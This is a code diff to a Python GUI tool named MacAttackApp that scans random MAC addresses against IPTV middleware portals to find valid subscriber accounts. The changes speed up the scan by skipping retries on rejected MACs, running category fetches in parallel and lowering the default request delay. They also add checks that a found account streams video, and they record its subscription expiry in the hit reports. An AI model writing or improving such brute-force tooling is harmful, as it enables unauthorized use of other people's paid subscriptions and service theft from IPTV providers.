@@ -288,10 +288,10 @@ def get_token(session: requests.Session, url: str, mac: str, timeout: int = 20,
             resp = session.get(handshake_url, cookies=cookies, headers=headers, timeout=timeout)
             
             if resp.status_code == 512:
-                logger.warning(f"Server returned 512 error - MAC may be invalid or blocked: {mac}")
-                if attempt < max_retries - 1:
-                    time.sleep(1)
-                    continue
+                # Definitive answer from the portal: MAC is invalid/blocked.
+                # Retrying costs 1s + 2s backoff per invalid MAC and was the
+                # single biggest throughput bottleneck in a random-MAC scan.
+                logger.warning(f"Server returned 512 - MAC invalid/blocked: {mac}")
                 return None, None
             
             if resp.status_code == 403:
@@ -354,7 +354,11 @@ def get_token(session: requests.Session, url: str, mac: str, timeout: int = 20,
                     f"&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
                 )
                 try:
-                    _ = session.get(url1, timeout=timeout)
+                    pr = session.get(url1, timeout=timeout)
+                    try:
+                        session.expire_profile = pr.json().get("js", {})
+                    except Exception:
+                        pass
                 except requests.RequestException:
                     pass
 
@@ -411,52 +415,45 @@ def cookies_headers_for(session: requests.Session, mac: str, token: str, token_r
 
 
 def fetch_categories(session, base_url, mac, token, token_random):
-    """Return dict: { 'Live': [...], 'Movies': [...], 'Series': [...] }."""
+    """Return dict: { 'Live': [...], 'Movies': [...], 'Series': [...] }.
+
+    The three category fetches (get_genres / VOD cats / series cats) run in
+    parallel on separate sessions instead of one after another."""
     data = {"Live": [], "Movies": [], "Series": []}
     cookies, headers = cookies_headers_for(session, mac, token, token_random)
 
-    try:
-        u = f"{base_url}/{player_portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
-        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
-        r.raise_for_status()
-        js = r.json().get("js", [])
-        data["Live"] = [
-            {"name": item["title"], "category_type": "IPTV", "category_id": item["id"]}
-            for item in js
-        ]
-        data["Live"].sort(key=lambda x: x["name"])
-    except Exception as e:
-        logger.warning(f"get_genres failed: {e}")
+    def _run(kind):
+        s = create_session_with_retries()
+        s.proxies = dict(getattr(session, "proxies", {}) or {})
+        s.cookies.update(cookies)
+        s.headers.update(headers)
+        try:
+            if kind == "Live":
+                u = f"{base_url}/{player_portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
+                js = s.get(u, timeout=15).json().get("js", [])
+                return [{"name": i["title"], "category_type": "IPTV", "category_id": i["id"]} for i in js]
+            if kind == "Movies":
+                u = f"{base_url}/{player_portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
+                js = s.get(u, timeout=15).json().get("js", [])
+                return [{"name": i["title"], "category_type": "VOD", "category_id": i["id"]} for i in js]
+            u = f"{base_url}/{player_portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
+            js = s.get(u, timeout=15).json().get("js", [])
+            return [{"name": i["title"], "category_type": "Series", "category_id": i["id"]} for i in js]
+        except Exception as e:
+            logger.warning(f"get_{kind}_categories failed: {e}")
+            return []
 
+    kinds = ("Live", "Movies", "Series")
     try:
-        u = f"{base_url}/{player_portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
-        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
-        r.raise_for_status()
-        js = r.json().get("js", [])
-        data["Movies"] = [
-            {"name": item["title"], "category_type": "VOD", "category_id": item["id"]}
-            for item in js
-        ]
-        data["Movies"].sort(key=lambda x: x["name"])
+        with ThreadPoolExecutor(max_workers=3) as ex:
+            results = list(ex.map(_run, kinds))
     except Exception as e:
-        logger.warning(f"get_vod_categories failed: {e}")
-
-    try:
-        u = f"{base_url}/{player_portaltype}?type=series&action=get_categories&JsHttpRequest=1-xml"
-        r = session.get(u, cookies=cookies, headers=headers, timeout=15)
-        r.raise_for_status()
-        js = r.json().get("js", [])
-        data["Series"] = [
-            {"name": item["title"], "category_type": "Series", "category_id": item["id"]}
-            for item in js
-        ]
-        data["Series"].sort(key=lambda x: x["name"])
-    except Exception as e:
-        logger.warning(f"get_series_categories failed: {e}")
-
+        logger.warning(f"fetch_categories parallel failed, falling back: {e}")
+        results = [_run(k) for k in kinds]
+    for grp, items in zip(kinds, results):
+        data[grp] = items
+        data[grp].sort(key=lambda x: x["name"])
     return data
-
-
 def fetch_channels(session, base_url, mac, token, token_random, category_type, category_id):
     """Return a list of channels/items for the given category."""
     cookies, headers = cookies_headers_for(session, mac, token, token_random)
@@ -507,6 +504,113 @@ def fetch_channels(session, base_url, mac, token, token_random, category_type, c
     except Exception as e:
         logger.error(f"fetch_channels failed: {e}")
         return []
+
+
+def fetch_channel_count(session, base_url, mac, token, token_random, category_type, category_id):
+    """Fast channel count: fetch only page 0 and use total_items (pages 1-9 are a
+    waste just for counting). Returns an int."""
+    cookies, headers = cookies_headers_for(session, mac, token, token_random)
+    if category_type == "IPTV":
+        base = f"{base_url}/{player_portaltype}?type=itv&action=get_ordered_list&genre={category_id}"
+    elif category_type == "VOD":
+        base = f"{base_url}/{player_portaltype}?type=vod&action=get_ordered_list&category={category_id}"
+    elif category_type == "Series":
+        base = f"{base_url}/{player_portaltype}?type=series&action=get_ordered_list&category={category_id}"
+    else:
+        return 0
+    try:
+        r = session.get(f"{base}&JsHttpRequest=1-xml&p=0", cookies=cookies, headers=headers, timeout=20)
+        r.raise_for_status()
+        js = r.json()
+        return int(js.get("js", {}).get("total_items", 0))
+    except Exception as e:
+        logger.error(f"fetch_channel_count failed: {e}")
+        return 0
+
+
+
+def get_expire_date(profile):
+    """Return the portal-published subscription expiry, or None.
+
+    Only real expiry fields count; "last seen" timestamps are deliberately not
+    used, because printing them as an expiry date would be misleading."""
+    if not isinstance(profile, dict):
+        return None
+    for key in ("exp_date", "expire_date", "expire", "end_date", "gen_date",
+                "active_date", "expire_billing_date", "tariff_expired_date"):
+        val = profile.get(key)
+        if val in (None, ""):
+            continue
+        sval = str(val).strip()
+        if sval.startswith("0000") or sval in ("0", "-1", "null", "None"):
+            continue
+        return sval
+    return None
+
+
+def verify_playable(session, base_url, mac, token, token_random):
+    """Confirm a hit is real: create_link a Live channel and fetch its .ts stream.
+
+    Returns (playable: bool, reason: str). A proxy-protected stream (HTTP 407)
+    counts as playable because the media endpoint is alive behind an auth proxy."""
+    try:
+        cookies, headers = cookies_headers_for(session, mac, token, token_random)
+        genre_url = (f"{base_url}/{player_portaltype}?type=itv&action=get_genres"
+                     "&JsHttpRequest=1-xml")
+        g = session.get(genre_url, cookies=cookies, headers=headers, timeout=15)
+        genres = g.json().get("js", [])
+        if not genres:
+            return (False, "no live categories")
+        cat = genres[0]
+        cat_id = cat.get("category_id") or cat.get("id") or cat.get("genre_id")
+        list_url = (f"{base_url}/{player_portaltype}?type=itv&action=get_ordered_list"
+                    f"&genre={cat_id}&JsHttpRequest=1-xml&p=0")
+        lr = session.get(list_url, cookies=cookies, headers=headers, timeout=15)
+        lr.raise_for_status()
+        data0 = lr.json().get("js", {}).get("data", [])
+        if not data0:
+            return (False, "no channels")
+        cmd = data0[0].get("cmd") or f"http://localhost/ch/{data0[0].get('id')}_#"
+        if cmd.startswith("ffmpeg "):
+            cmd = cmd[len("ffmpeg "):]
+        link_url = (f"{base_url}/{player_portaltype}"
+                    f"?type=itv&action=create_link&cmd={quote(cmd)}&series="
+                    "&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml")
+        lr2 = session.get(link_url, cookies=cookies, headers=headers, timeout=20)
+        link_js = lr2.json().get("js", {}) if lr2.text and lr2.status_code == 200 else {}
+        stream = link_js.get("cmd")
+        if not stream:
+            return (False, "create_link no stream")
+        if stream.startswith("ffmpeg "):
+            stream = stream[len("ffmpeg "):]
+        probe = requests.Session()
+        probe.headers.update({"User-Agent": headers["User-Agent"],
+                              "Accept-Encoding": "identity"})
+        probe.cookies.update(cookies)
+        try:
+            probe.proxies = dict(getattr(session, "proxies", {}) or {})
+            r = probe.get(stream, timeout=12, stream=True, allow_redirects=True)
+            chunk = b""
+            for part in r.iter_content(65536):
+                chunk += part
+                if len(chunk) > 300000:
+                    break
+            hls = chunk[:200000].find(b"EXTM3U") >= 0
+            ps = chunk[2048:2052] == b"\x00\x00\x01\xBA"
+            if r.status_code in (200, 302, 301) and (hls or ps or len(chunk) > 50000):
+                return (True, "video")
+            if r.status_code == 407:
+                return (True, "proxy-protected")
+            if r.status_code in (404, 401, 403):
+                return (False, f"HTTP {r.status_code}")
+            if r.status_code == 200 and len(chunk) > 10000:
+                return (True, f"HTTP {r.status_code}")
+            return (False, f"HTTP {r.status_code} ({len(chunk)}b)")
+        except requests.RequestException as e:
+            return (False, f"fetch err: {e}")
+    except Exception as e:
+        logger.error(f"verify_playable failed: {e}")
+        return (False, f"err: {e}")
 
 
 def create_link(session, base_url, mac, token, token_random, cmd, episode_number=None, media_type_hint=None):
@@ -829,7 +933,7 @@ class MacAttackApp(tk.Tk):
         self.favorites_file = os.path.join(self.settings_path, "favorites.json")
 
         # Rate limiting
-        self.request_delay = tk.DoubleVar(value=0.3)
+        self.request_delay = tk.DoubleVar(value=0.05)
 
         # Build UI with menu
         self._build_menu()
@@ -1135,7 +1239,7 @@ class MacAttackApp(tk.Tk):
         
         tk.Label(row3, text="⏱️ Rate Limit (sec):", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10)).pack(side="left", padx=(20, 5))
-        ttk.Spinbox(row3, from_=0.1, to=5.0, increment=0.1, textvariable=self.request_delay, 
+        ttk.Spinbox(row3, from_=0.0, to=5.0, increment=0.05, textvariable=self.request_delay, 
                    width=6, font=("Helvetica", 10)).pack(side="left")
         
         # Row 4: Control buttons
@@ -1837,7 +1941,7 @@ class MacAttackApp(tk.Tk):
             self.speed_scale.set(speed)
             
             self.prefix_var.set(s.get("prefix", self.prefix_var.get()))
-            self.request_delay.set(float(s.get("request_delay", "0.3")))
+            self.request_delay.set(float(s.get("request_delay", "0.05")))
             self.autoload_to_player.set(s.get("autoload_to_player", "False") == "True")
             self.autopause_player.set(s.get("autopause_player", "True") == "True")
             self.single_output_file.set(s.get("single_output_file", "True") == "True")
@@ -1902,7 +2006,7 @@ class MacAttackApp(tk.Tk):
                 self.portal_type_var.set("Autodetect")
                 self._set_speed_preset(10)
                 self.prefix_var.set('00:1A:79: (default)')
-                self.request_delay.set(0.3)
+                self.request_delay.set(0.05)
                 self.autoload_to_player.set(False)
                 self.autopause_player.set(True)
                 self.single_output_file.set(True)
@@ -2118,22 +2222,33 @@ class MacAttackApp(tk.Tk):
                 for group in ("Live", "Movies", "Series"):
                     if cats.get(group) and len(cats[group]) > 0:
                         first_cat = cats[group][0]
-                        chs = fetch_channels(
+                        cnt = fetch_channel_count(
                             session, self.base_url, mac, token, token_random,
-                            first_cat["category_type"], 
+                            first_cat["category_type"],
                             first_cat.get("category_id") or first_cat.get("genre_id")
                         )
-                        total_channels += len(chs)
-                        if len(cats[group]) > 1:
-                            total_channels += len(chs) * (len(cats[group]) - 1)
+                        total_channels += cnt * len(cats[group])
                         break
                 
                 if total_channels > 0:
                     self.hits_count += 1
                     self.stats["hits"] += 1
                     self.hits_label_var.set(f"HITS: {self.hits_count}")
-                    
                     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    
+                    # Expire date (from the get_profile captured during handshake)
+                    expire_date = get_expire_date(getattr(session, "expire_profile", None))
+                    expire_str = expire_date if expire_date else "N/A (portal does not publish it)"
+                    
+                    # Playability proof: one stream fetch to confirm a real hit
+                    playable = "No"; playable_reason = ""
+                    try:
+                        pl, pr = verify_playable(
+                            session, self.base_url, mac, token, token_random)
+                        playable = "Yes" if pl else "No"
+                        playable_reason = pr
+                    except Exception:
+                        pass
                     
                     hit_data = {
                         "portal": self.base_url,
@@ -2141,6 +2256,9 @@ class MacAttackApp(tk.Tk):
                         "proxy": proxy_str,
                         "found_on": now,
                         "channels": total_channels,
+                        "expire_date": expire_str,
+                        "playable": playable,
+                        "playable_reason": playable_reason,
                         "categories": {
                             "live": len(cats.get("Live", [])),
                             "movies": len(cats.get("Movies", [])),
@@ -2149,6 +2267,8 @@ class MacAttackApp(tk.Tk):
                     }
                     self.found_macs_list.append(hit_data)
                     
+                    reason_suffix = (f" ({playable_reason})"
+                                     if playable == "No" and playable_reason else "")
                     msg = (
                         f"\n{'='*60}\n"
                         f"🎯 HIT FOUND!\n"
@@ -2158,12 +2278,13 @@ class MacAttackApp(tk.Tk):
                         f"Proxy IP: {proxy_str}\n"
                         f"Found on: {now}\n"
                         f"Channels: ~{total_channels}\n"
+                        f"Playable: {playable}{reason_suffix}\n"
+                        f"Expire  : {expire_str}\n"
                         f"Live    : {len(cats.get('Live', []))} categories\n"
                         f"Movies  : {len(cats.get('Movies', []))} categories\n"
                         f"Series  : {len(cats.get('Series', []))} categories\n"
                         f"{'='*60}\n\n"
                     )
-                    
                     self._append_output(msg)
                     self.found_macs_text.insert("end", msg)
                     self.found_macs_text.see("end")
@@ -2245,8 +2366,32 @@ class MacAttackApp(tk.Tk):
                 total_categories = len(cats.get("Live", [])) + len(cats.get("Movies", [])) + len(cats.get("Series", []))
                 
                 if total_categories > 0:
+                    total_channels = 0
+                    for grp in ("Live", "Movies", "Series"):
+                        if cats.get(grp) and len(cats[grp]) > 0:
+                            fc = cats[grp][0]
+                            cnt = fetch_channel_count(
+                                session, base_url, mac, token, token_random,
+                                fc["category_type"],
+                                fc.get("category_id") or fc.get("genre_id"))
+                            total_channels += cnt * len(cats[grp])
+                    
+                    expire_date = get_expire_date(getattr(session, "expire_profile", None))
+                    expire_str = expire_date if expire_date else "N/A (portal does not publish it)"
+                    
+                    playable = "No"; pr_reason = ""
+                    try:
+                        pl, pr = verify_playable(session, base_url, mac, token, token_random)
+                        playable = "Yes" if pl else "No"
+                        pr_reason = pr
+                    except Exception:
+                        pass
+                    
                     msg = (
                         f"✅ Success! MAC {mac} is valid!\n"
+                        f"   Channels: ~{total_channels}\n"
+                        f"   Playable: {playable}{' (' + pr_reason + ')' if playable=='No' and pr_reason else ''}\n"
+                        f"   Expire  : {expire_str}\n"
                         f"   Live: {len(cats.get('Live', []))} categories\n"
                         f"   Movies: {len(cats.get('Movies', []))} categories\n"
                         f"   Series: {len(cats.get('Series', []))} categories\n\n"
@@ -2330,7 +2475,8 @@ class MacAttackApp(tk.Tk):
             try:
                 with open(f, 'w', newline='', encoding='utf-8') as csvfile:
                     fieldnames = ['Portal', 'MAC Address', 'Proxy', 'Found On', 'Total Channels', 
-                                 'Live Categories', 'Movie Categories', 'Series Categories']
+                                                                   'Playable', 'Expire',
+'Live Categories', 'Movie Categories', 'Series Categories']
                     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                     
                     writer.writeheader()
@@ -2341,6 +2487,8 @@ class MacAttackApp(tk.Tk):
                             'Proxy': hit['proxy'],
                             'Found On': hit['found_on'],
                             'Total Channels': hit['channels'],
+                            'Playable': hit.get('playable', ''),
+                            'Expire': hit.get('expire_date', ''),
                             'Live Categories': hit['categories']['live'],
                             'Movie Categories': hit['categories']['movies'],
                             'Series Categories': hit['categories']['series']
